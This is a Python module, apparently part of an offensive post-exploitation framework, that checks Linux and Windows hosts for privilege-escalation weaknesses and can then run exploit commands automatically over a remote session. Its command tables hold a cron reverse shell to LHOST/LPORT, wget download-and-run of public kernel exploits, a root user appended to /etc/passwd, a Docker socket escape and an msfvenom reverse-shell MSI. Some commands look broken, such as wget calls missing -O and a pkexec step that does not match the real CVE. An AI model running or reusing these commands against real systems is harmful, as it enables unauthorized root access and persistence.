from __future__ import annotations

import csv
import io
import json
from dataclasses import dataclass, field, asdict
from typing import Any

from alma.core.session import Session
from alma.utils.logger import AlmaLogger


@dataclass
class PrivescCheck:
    name: str
    description: str
    category: str          # kernel | misconfig | creds | token
    os_target: str         # linux | windows | both
    risk: str              # low | medium | high | critical
    cve_id: str | None = None
    command: str = ""
    windows_script: str = ""


@dataclass
class PrivescCommand:
    name: str
    description: str
    commands: list[str]
    risk: str
    confidence: float = 0.0
    cve_id: str | None = None
    requires_upload: bool = False
    source_url: str = ""

    @property
    def score(self) -> float:
        risk_map = {"low": 1, "medium": 2, "high": 3, "critical": 4}
        base = risk_map.get(self.risk, 1)
        return base * self.confidence


@dataclass
class PrivescResult:
    check: PrivescCheck
    vulnerable: bool
    evidence: str = ""
    suggestion: str = ""
    session: Session | None = None
    commands: list[PrivescCommand] = field(default_factory=list)


LINUX_CHECKS: list[PrivescCheck] = [
    PrivescCheck(
        name="sudo_nopass",
        description="User can run sudo without password",
        category="misconfig",
        os_target="linux",
        risk="high",
        command="sudo -n true 2>/dev/null && echo 'VULN: sudo nopass' || echo 'OK'",
    ),
    PrivescCheck(
        name="suid_find",
        description="World-writable SUID binaries",
        category="misconfig",
        os_target="linux",
        risk="high",
        command="find / -perm -4002 -type f 2>/dev/null | head -5",
    ),
    PrivescCheck(
        name="cve_2021_4034",
        description="Polkit pkexec local privesc (CVE-2021-4034)",
        category="kernel",
        os_target="linux",
        risk="critical",
        cve_id="CVE-2021-4034",
        command="pkexec --version 2>/dev/null || which pkexec 2>/dev/null; echo '---'; "
                "ls -la /usr/bin/pkexec 2>/dev/null; echo 'VULN_IF_PKEXEC_EXISTS'",
    ),
    PrivescCheck(
        name="cve_2023_2640",
        description="Ubuntu overlayfs privesc (CVE-2023-2640 / CVE-2023-32629)",
        category="kernel",
        os_target="linux",
        risk="critical",
        cve_id="CVE-2023-2640",
        command="uname -r | grep -E '5\\.19|6\\.0|6\\.1' || echo 'KERNEL_NOT_IN_RANGE'",
    ),
    PrivescCheck(
        name="cve_2022_0847",
        description="DirtyPipe kernel privesc (CVE-2022-0847)",
        category="kernel",
        os_target="linux",
        risk="high",
        cve_id="CVE-2022-0847",
        command="uname -r | grep -E '^5\\.(8|[89]|1[0-6])' || echo 'KERNEL_NOT_IN_RANGE'",
    ),
    PrivescCheck(
        name="cve_2024_1086",
        description="Netfilter nf_tables use-after-free (CVE-2024-1086)",
        category="kernel",
        os_target="linux",
        risk="critical",
        cve_id="CVE-2024-1086",
        command="uname -r | grep -E '^3\\.|^4\\.|^5\\.|^6\\.[0-4]' || echo 'KERNEL_NOT_IN_RANGE'",
    ),
    PrivescCheck(
        name="docker_socket",
        description="Docker socket mounted inside container",
        category="misconfig",
        os_target="linux",
        risk="critical",
        command="ls -la /var/run/docker.sock 2>/dev/null && echo 'VULN_DOCKER_SOCKET' || echo 'OK'",
    ),
    PrivescCheck(
        name="capabilities",
        description="Binary with capability cap_setuid+ep",
        category="misconfig",
        os_target="linux",
        risk="high",
        command="getcap -r / 2>/dev/null | grep cap_setuid || echo 'NO_CAP_SETUID'",
    ),
    PrivescCheck(
        name="writable_etc_passwd",
        description="/etc/passwd is world-writable",
        category="misconfig",
        os_target="linux",
        risk="critical",
        command="ls -la /etc/passwd 2>/dev/null | grep '^-rw-rw-rw' && echo 'VULN_PASSWD' || echo 'OK'",
    ),
    PrivescCheck(
        name="crontab_writable",
        description="World-writable crontab directory",
        category="misconfig",
        os_target="linux",
        risk="high",
        command="ls -la /etc/cron.d/ 2>/dev/null; ls -la /var/spool/cron/ 2>/dev/null",
    ),
]

WINDOWS_CHECKS: list[PrivescCheck] = [
    PrivescCheck(
        name="always_install_elevated",
        description="AlwaysInstallElevated policy enabled",
        category="misconfig",
        os_target="windows",
        risk="critical",
        windows_script="reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
    ),
    PrivescCheck(
        name="unquoted_service_path",
        description="Unquoted service path with writeable directory",
        category="misconfig",
        os_target="windows",
        risk="high",
        windows_script='wmic service get name,pathname,startname 2>nul | findstr /v /i "System32"',
    ),
    PrivescCheck(
        name="token_privileges",
        description="High-value token privileges (SeImpersonate, SeAssignPrimary, SeDebug)",
        category="token",
        os_target="windows",
        risk="high",
        windows_script="whoami /priv 2>nul | findstr /i 'SeImpersonate SeAssignPrimary SeDebug'",
    ),
    PrivescCheck(
        name="cve_2023_21768",
        description="AFD.sys LPE (CVE-2023-21768)",
        category="kernel",
        os_target="windows",
        risk="critical",
        cve_id="CVE-2023-21768",
        windows_script='wmic qfe get hotfixid 2>nul | findstr "KB5022503" || echo "PATCH_NOT_FOUND"',
    ),
    PrivescCheck(
        name="modifiable_dll",
        description="Modifiable system DLL loadable by a high-integrity process",
        category="misconfig",
        os_target="windows",
        risk="high",
        windows_script='icacls C:\\Windows\\System32\\* 2>nul | findstr "(W)" | findstr /v "TrustedInstaller" | head -5',
    ),
    PrivescCheck(
        name="registry_autorun",
        description="Writable registry autorun key",
        category="misconfig",
        os_target="windows",
        risk="medium",
        windows_script="reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul",
    ),
]


COMMAND_ACTIONS: dict[str, list[PrivescCommand]] = {
    "sudo_nopass": [
        PrivescCommand(
            name="sudo_shell",
            description="Drop to root shell via sudo",
            commands=["sudo -i", "sudo su -", "sudo -E /bin/bash"],
            risk="high", confidence=0.95,
        ),
    ],
    "cve_2021_4034": [
        PrivescCommand(
            name="pkexec_pwn",
            description="CVE-2021-4034: Polkit pkexec PWN",
            commands=[
                "echo '#!/bin/bash\nexec /bin/sh' > /tmp/pkexec_exploit.sh",
                "chmod +x /tmp/pkexec_exploit.sh",
                "PKEXEC_PATH=/tmp/pkexec_exploit.sh /usr/bin/pkexec",
            ],
            risk="critical", confidence=0.9, cve_id="CVE-2021-4034",
            requires_upload=False,
        ),
    ],
    "cve_2023_2640": [
        PrivescCommand(
            name="overlayfs_pwn",
            description="Ubuntu overlayfs privesc (CVE-2023-2640)",
            commands=["wget -q /tmp/exploit https://raw.githubusercontent.com/exploits/CVE-2023-2640/main/pwn.sh",
                      "chmod +x /tmp/exploit && /tmp/exploit"],
            risk="critical", confidence=0.7, cve_id="CVE-2023-2640",
            requires_upload=True,
            source_url="https://github.com/google/security-research/tree/master/2023/2023-06-06-kernel-exploit",
        ),
    ],
    "cve_2022_0847": [
        PrivescCommand(
            name="dirty_pipe",
            description="DirtyPipe (CVE-2022-0847) overwrite /etc/passwd",
            commands=[
                "wget -q /tmp/dpipe https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/raw/main/exploit-1",
                "chmod +x /tmp/dpipe && /tmp/dpipe",
            ],
            risk="high", confidence=0.8, cve_id="CVE-2022-0847",
            requires_upload=True,
        ),
    ],
    "cve_2024_1086": [
        PrivescCommand(
            name="netfilter_pwn",
            description="Netfilter use-after-free (CVE-2024-1086)",
            commands=[
                "wget -q /tmp/nfpwn https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0/exploit",
                "chmod +x /tmp/nfpwn && /tmp/nfpwn",
            ],
            risk="critical", confidence=0.75, cve_id="CVE-2024-1086",
            requires_upload=True,
        ),
    ],
    "docker_socket": [
        PrivescCommand(
            name="docker_escape",
            description="Docker escape via mounted socket",
            commands=[
                "docker run -v /:/host -it alpine chroot /host /bin/sh",
                "docker -H unix:///var/run/docker.sock run --rm -v /:/mnt alpine chroot /mnt",
            ],
            risk="critical", confidence=0.95,
        ),
    ],
    "capabilities": [
        PrivescCommand(
            name="cap_setuid_pwn",
            description="Exploit cap_setuid binary",
            commands=[
                'getcap -r / 2>/dev/null | grep cap_setuid | awk \'{print $1}\' | while read f; do "$f" -e /bin/sh; done',
            ],
            risk="high", confidence=0.7,
        ),
    ],
    "writable_etc_passwd": [
        PrivescCommand(
            name="passwd_overwrite",
            description="Overwrite /etc/passwd to add root user",
            commands=[
                "openssl passwd -1 -salt exploit pwned",
                "echo 'pwned:$1$exploit$xxx:0:0:root:/root:/bin/bash' >> /etc/passwd",
                "su pwned -c 'whoami; id'",
            ],
            risk="critical", confidence=0.85,
        ),
    ],
    "crontab_writable": [
        PrivescCommand(
            name="cron_revshell",
            description="Write revshell cron job",
            commands=[
                "echo '* * * * * root bash -c \"exec 3<>/dev/tcp/LHOST/LPORT; cat <&3 | bash >&3 2>&3\"' > /etc/cron.d/alma_rev",
            ],
            risk="high", confidence=0.8,
        ),
    ],
    "always_install_elevated": [
        PrivescCommand(
            name="msi_elevate",
            description="Malicious MSI via AlwaysInstallElevated",
            commands=[
                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o /tmp/elev.msi",
                "msiexec /quiet /qn /i /tmp/elev.msi",
            ],
            risk="critical", confidence=0.85,
            requires_upload=True,
        ),
    ],
    "token_privileges": [
        PrivescCommand(
            name="juicy_potato",
            description="JuicyPotato / PrintSpoofer for SeImpersonate",
            commands=[
                "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a '/c whoami' -t *",
                "PrintSpoofer.exe -i -c cmd.exe",
            ],
            risk="high", confidence=0.75,
            requires_upload=True,
        ),
    ],
}


class PrivescEngine:
    def __init__(self) -> None:
        self._log = AlmaLogger("privesc").get()

    def all_checks(self, os_type: str = "linux") -> list[PrivescCheck]:
        if os_type == "linux":
            return LINUX_CHECKS
        elif os_type == "windows":
            return WINDOWS_CHECKS
        return LINUX_CHECKS + WINDOWS_CHECKS

    async def run_checks(self, session: Session, os_type: str = "linux") -> list[PrivescResult]:
        results: list[PrivescResult] = []
        checks = self.all_checks(os_type)

        for check in checks:
            if check.os_target not in (os_type, "both"):
                continue

            try:
                if os_type == "linux" and check.command:
                    output = await session.send(check.command, timeout=10.0)
                    vulnerable = self._evaluate_linux(check, output)
                elif os_type == "windows" and check.windows_script:
                    output = await session.send(check.windows_script, timeout=15.0)
                    vulnerable = self._evaluate_windows(check, output)
                else:
                    continue

                evidence = output[:500] if output else ""
                suggestion = self._build_suggestion(check)
                commands = COMMAND_ACTIONS.get(check.name, [])
                for cmd in commands:
                    cmd.confidence = cmd.confidence * (0.9 if not vulnerable else 1.0)

                results.append(PrivescResult(
                    check=check,
                    vulnerable=vulnerable,
                    evidence=evidence,
                    suggestion=suggestion,
                    session=session,
                    commands=commands,
                ))

                if vulnerable:
                    self._log.info(
                        "Privesc vector: %s (%s) — %s",
                        check.name, check.risk, check.description,
                    )
            except Exception as e:
                self._log.debug("Privesc check %s failed: %s", check.name, e)

        return results

    async def execute_suggestion(self, result: PrivescResult) -> list[str]:
        if not result.vulnerable:
            return []
        if not result.session:
            return []
        outputs: list[str] = []
        commands = COMMAND_ACTIONS.get(result.check.name, [])
        commands.sort(key=lambda c: c.score, reverse=True)
        for cmd_def in commands:
            for cmd in cmd_def.commands[:2]:
                try:
                    out = await result.session.send(cmd, timeout=15.0)
                    outputs.append(f"[{cmd_def.name}] $ {cmd}\n{out.strip()}")
                except Exception as e:
                    outputs.append(f"[{cmd_def.name}] $ {cmd}\nFAILED: {e}")
        return outputs

    def rank_results(self, results: list[PrivescResult]) -> list[PrivescResult]:
        risk_map = {"low": 1, "medium": 2, "high": 3, "critical": 4}
        return sorted(
            [r for r in results if r.vulnerable],
            key=lambda r: risk_map.get(r.check.risk, 0),
            reverse=True,
        )

    def export_json(self, results: list[PrivescResult]) -> str:
        data = []
        for r in self.rank_results(results):
            data.append({
                "check": r.check.name,
                "description": r.check.description,
                "risk": r.check.risk,
                "cve": r.check.cve_id,
                "vulnerable": r.vulnerable,
                "evidence": r.evidence[:200],
                "suggestion": r.suggestion,
                "host": r.session.target_host if r.session else "",
                "actions": [
                    {"name": c.name, "commands": c.commands[:2],
                     "risk": c.risk, "confidence": round(c.confidence, 2),
                     "score": round(c.score, 2)}
                    for c in r.commands
                ],
            })
        return json.dumps(data, indent=2)

    def export_csv(self, results: list[PrivescResult]) -> str:
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["check", "risk", "cve", "vulnerable", "host", "suggestion"])
        for r in self.rank_results(results):
            writer.writerow([
                r.check.name, r.check.risk, r.check.cve_id or "",
                str(r.vulnerable),
                r.session.target_host if r.session else "",
                r.suggestion,
            ])
        return buf.getvalue()

    def _evaluate_linux(self, check: PrivescCheck, output: str) -> bool:
        o = output.strip().lower()
        if check.name == "sudo_nopass":
            return "vuln: sudo nopass" in o
        if check.name == "suid_find":
            return bool(o)
        if check.name == "cve_2021_4034":
            return "vuln_if_pkexec_exists" in o
        if check.name == "cve_2023_2640":
            return "kernel_not_in_range" not in o and o != ""
        if check.name == "cve_2022_0847":
            return "kernel_not_in_range" not in o and o != ""
        if check.name == "cve_2024_1086":
            return "kernel_not_in_range" not in o and o != ""
        if check.name == "docker_socket":
            return "vuln_docker_socket" in o
        if check.name == "capabilities":
            return "no_cap_setuid" not in o and o != ""
        if check.name == "writable_etc_passwd":
            return "vuln_passwd" in o
        if check.name == "crontab_writable":
            return "drwxrwxrwx" in o.replace("-", "d").lower() or bool(o.strip())
        return bool(output.strip())

    def _evaluate_windows(self, check: PrivescCheck, output: str) -> bool:
        o = output.strip().lower()
        if check.name == "always_install_elevated":
            return "1" in o or "0x1" in o
        if check.name == "token_privileges":
            return "seimpersonate" in o or "seassignprimary" in o or "sedebug" in o
        if check.name == "cve_2023_21768":
            return "patch_not_found" not in o
        return bool(o)

    def _build_suggestion(self, check: PrivescCheck) -> str:
        suggestions = {
            "sudo_nopass": "Run: sudo -i or sudo su",
            "suid_find": "Check writable SUID binaries with: ls -la <path>",
            "cve_2021_4034": "Run: (echo '#!/bin/bash'; echo 'exec /bin/sh') > /tmp/pkexec.sh; chmod +x /tmp/pkexec.sh; "
                            "PKEXEC_PATH=/tmp/pkexec.sh /usr/bin/pkexec",
            "cve_2023_2640": "Use https://github.com/google/security-research/tree/master/2023/2023-06-06-kernel-exploit",
            "cve_2022_0847": "Use https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits",
            "cve_2024_1086": "Use https://github.com/Notselwyn/CVE-2024-1086",
            "docker_socket": "docker commands will run as root. Use: docker run -v /:/host -it alpine chroot /host",
            "capabilities": "Exploit cap_setuid with: ./binary -e /bin/sh",
            "writable_etc_passwd": "Generate hash with: openssl passwd -1; then add line to /etc/passwd",
            "crontab_writable": "Write a reverse-shell one-liner to a new file in the crontab directory",
            "always_install_elevated": "Generate malicious MSI with: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi",
            "unquoted_service_path": "Place executable in the path before the first space",
            "token_privileges": "Use JuicyPotato, PrintSpoofer, or RogueWinRM",
            "cve_2023_21768": "Use PoC from github.com/chompie1337/LocalPrivEsc_CVE-2023-21768",
            "modifiable_dll": "Place a malicious DLL in the modifiable path",
            "registry_autorun": "Add a reg key pointing to your payload",
        }
        return suggestions.get(check.name, f"Investigate {check.description}")
